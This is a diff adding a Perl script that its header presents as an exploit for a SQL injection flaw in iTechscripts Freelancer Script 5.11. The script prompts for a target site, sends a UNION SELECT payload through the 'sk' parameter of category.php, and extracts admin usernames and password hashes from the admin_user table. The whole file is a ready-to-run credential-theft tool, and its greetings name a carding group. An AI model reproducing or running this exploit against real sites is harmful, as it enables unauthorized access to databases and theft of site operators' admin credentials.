@@ -1,0 +1,39 @@
+#!/usr/bin/perl -w
+
+# iTechscripts Freelancer Script v5.11 (sk) SQL Injection Vulnerability
+# Author	: v3n0m
+# Contact	: v3n0m[at]outlook[dot]com
+# Date		: January, 11-2017 GMT +7:00 Jakarta, Indonesia
+# Software	: Freelancer Script
+# Version	: 5.11 Lower versions may also be affected
+# Price 	: US$199.00
+# Link  	: http://itechscripts.com/freelancer-script/
+# Greetz	: YOGYACARDERLINK, CAFE BMW, Dhea Fathin Karima & YOU !!
+sub clear{
+	system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+}
+clear();
+print "|----------------------------------------------------|\n";
+print "| iTechscripts Freelancer Script 5.11 SQLi Exploiter |\n";
+print "| Coded by : v3n0m                                   |\n";
+print "| Greetz   : YOGYACARDERLINK                         |\n";
+print "|----------------------------------------------------|\n";
+use LWP::UserAgent;
+print "\nInsert Target:[http://wwww.target.com/path/]: ";
+chomp(my $target=<STDIN>);
+print "\n[!] Exploiting Progress...\n";
+print "\n";
+$concat="group_concat(username,char(58),password)";
+$table="admin_user";
+$dheakarima = LWP::UserAgent->new() or die "Could not initalize browser\n";
+$dheakarima->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$host = $target . "category.php?sk=-9999+union+all+select+null,null,".$concat.",null+from/**/".$table."+--+";
+$xf2r = $dheakarima->request(HTTP::Request->new(GET=>$host));
+$answer = $xf2r->content; 
+if ($answer =~/([0-9a-fA-F]{32})/) {
+	print "\n[+] Admin Password : $1\n";
+	print "[+] Success !! Check target for details...\n";
+	print "\n";
+}
+else{print "\n[-] Failed\n";
+}
